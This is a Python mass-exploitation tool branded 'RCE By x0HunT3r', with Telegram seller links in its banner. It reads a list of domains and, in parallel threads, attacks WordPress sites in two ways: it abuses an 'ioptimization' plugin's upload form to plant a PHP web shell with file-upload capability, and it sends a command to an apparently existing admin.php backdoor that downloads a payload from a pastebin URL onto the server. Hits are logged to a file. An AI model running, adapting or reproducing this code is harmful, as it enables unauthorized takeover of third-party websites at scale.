from urllib.parse import urlparse
import requests,random,string,urllib3,threading ,sys,os,re
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from colorama import Fore, Back ,Style, init ; init(autoreset=True)



class IO:
    def __init__( self  , domain ):

        if "://" not in domain:
            self.url = "http://%s" % domain
        else:
            self.url = domain
        
        self.randomname = None
        self.dirs = None
        self.uploadPath = None
        self.path = None

    def __checkif( self , types = True ):

        #self.path = "%s/wp-content/plugins/ioptimization/IOptimize.php?rchk"  % self.url

        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                        "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip,deflate",
                            "Origin": self.url , "Connection": "close", "Referer": self.url}

        if types:
            res = requests.get( self.path , headers=headers  , timeout=5, verify=False).text

            if "ioptimization" in res :
                self.dirs = re.findall('<input type="text" name="l" value="(.*?)"' , res )[0]
                return True
            else:
                return False
        else:
            res = requests.get( self.uploadPath , headers=headers , timeout=5, verify=False).text
            if "x0HunT3r" in res :
                return True
            else:
                return False


        #return True


    def __upload( self ):
        
        self.randomname = "%s.php" % ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(8))

        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0",
                   "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                   "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate",
                   "Content-Type": "multipart/form-data; boundary=---------------------------26915066963547510040556919793",
                   "Origin": self.url , "Connection": "close", "Referer": self.path,
                   "Upgrade-Insecure-Requests": "1"}
        data = """-----------------------------26915066963547510040556919793\r\nContent-Disposition: form-data; name=\"l\"\r\n\r\n%s\r\n-----------------------------26915066963547510040556919793\r\nContent-Disposition: form-data; name=\"userfile\"; filename=\"%s\"\r\nContent-Type: application/octet-stream\r\n\r\n<html>\r\n<title> x0HunT3r </title>\r\n<center>\r\n\t<h1> x0HunT3r </h1>\r\n<?php echo '<b>System Info:</b> '.php_uname().'<br>'.'<b>Current Directory:</b> '.getcwd();echo '<br><form method=\"post\" enctype=\"multipart/form-data\" name=\"uploader\" id=\"uploader\"><input type=\"file\" name=\"file\" size=\"20\"><input name=\"_upl\" type=\"submit\" id=\"_upl\" value=\"Uploaded\"></form></td></tr></table></pre>';if($_FILES){if(!empty($_FILES['file'])){move_uploaded_file($_FILES['file']['tmp_name'],$_FILES['file']['name']);echo \"<b>File Uploaded !!!</b><br>\";}else{echo \"<b>Upload Failed !!!</b><br><br>\";}}?>\n\r\n-----------------------------26915066963547510040556919793--\r\n""" % ( self.dirs , self.randomname )
        #print(data)
        requests.post( self.path , headers=headers, data=data , timeout=5, verify=False).text
        return self.path.replace( "IOptimize.php?rchk" , self.randomname)
    
    def __finaly( self ):
        self.path = "%s/wp-content/plugins/ioptimization/IOptimize.php?rchk"  % self.url

        if self.__checkif(True):
            if self.dirs:
                self.uploadPath = self.__upload()
                if self.__checkif(False):
                    return True , "Uploaded.txt" , "%s --> [Successfully Uploading] --> 1" % Fore.GREEN , self.uploadPath
                else:
                    return False , "shells.txt" , "%s --> [Failid-3] --> 1" % Fore.RED , self.path
            else:
                return False , "shells.txt" , "%s --> [Failid-2] --> 1" % Fore.RED , self.path
        else:
            return False , "" , "%s --> [Failid-1] --> 1" % Fore.RED , self.path

    def __str__(self):

        types , text , statu , path = self.__finaly()

        if types:
            with open(text ,'a' ,encoding="utf-8" ,  errors='ignore' ) as ff:
                ff.write( "%s\n" % path )

        return "%s %s %s" % ( self.url , Fore.WHITE , statu )

class Ai:
	def __init__ (  self  , domain ):
		self.randomi = "%s.php" % ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(8))
		self.headers = None
		self.fullpath = None
		
		if "://" not in domain:
			self.domain = "http://%s" % domain
		else:
			self.domain = domain

	def __jiblia( self ):
		self.fullpath = '%s/wp-content/%s' % ( self.domain , self.randomi ) 
		self.headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0",
			"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
					"Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate","DNT":"1",
							"Content-Type": "application/x-www-form-urlencoded",
									"Origin": self.domain, "Connection": "close", "Referer": self.domain }

		data = 'google=file_put_contents("%s" , file_get_contents("https://pastebin.com/raw/D9rAcDe5"));echo"x0HunT3r";' % self.randomi

		res = requests.post('%s/wp-content/admin.php' % self.domain , headers=self.headers, data=data , timeout=5 , verify=True ).text

		if "x0HunT3r" in str(res):
			return True
		else:
			return False
			
	def __check( self ):
		if self.__jiblia():
			res = requests.get( self.fullpath  , headers=self.headers  , timeout=5 , verify=True).text
			if "x0HunT3r" in str(res):
				return self.fullpath , "%s --> [Successfully Uploading] --> 2" % Fore.GREEN , True , True , "Uploaded.txt"
			else:
				return self.fullpath , "%s --> [Failid-2] --> 2" % Fore.RED , True , False , ""
		else:
			return self.fullpath , "%s --> [Failid-1] --> 2" % Fore.RED , False , False , ""

	def __str__( self ):
		fullpath , Statu , types , types_two , save = self.__check()

		if types_two :
			with open( save , "a" , encoding="utf-8" ,  errors='ignore' ) as ff:
				ff.write( "%s\n" % fullpath )
			return "%s %s %s " % ( self.domain , Fore.WHITE , Statu )
		else:
			return "%s %s %s " % ( self.domain  ,Fore.WHITE , Statu )

def main():

    def arabara3(domain):

        if ".php" in domain:
            domain = urlparse(domain).netloc

        try:
            print( Ai(domain) )
        except:
            pass

        try:
            print( IO(domain) )
        except:
            pass


    try:
        listdomain = open( sys.argv[1] ,encoding="utf-8" ,  errors='ignore').read().splitlines()
    except:
			
        try:
            listdomain = open( input("""[X0] WEBSITE : """) ,encoding="utf-8" ,  errors='ignore').read().splitlines()
        except:
            print("ERROR !")

		
    for domain in set(listdomain):
        t2 = threading.Thread( target=arabara3 ,args=( domain , ))
        t2.start()


if __name__ == "__main__":
    try:
        os.system('title RCE By x0HunT3r ')
    except:
        os.system('title "% RCE By x0HunT3r %" ')
		
    print("""                   .    _  .     _____________
                   |\_|/__/|    /             \ 
                  / / \/ \  \  /   RCE 2022    \ 
                 /__|X||X|__ \ \   2022/12/6   /
                |/_ \_/\_/ _\ | \  ___________/
                | | (____) | ||  |/
                \/\___/\__/  // _/
                (_/         ||
                 |          ||\ 
                  \        //_/
                   \______//
                  __|| __||      CANAL : https://t.me/x0Seller
                 (____(____)     TELEGRAM : https://t.me/x0HunT3r 
""")
    main()

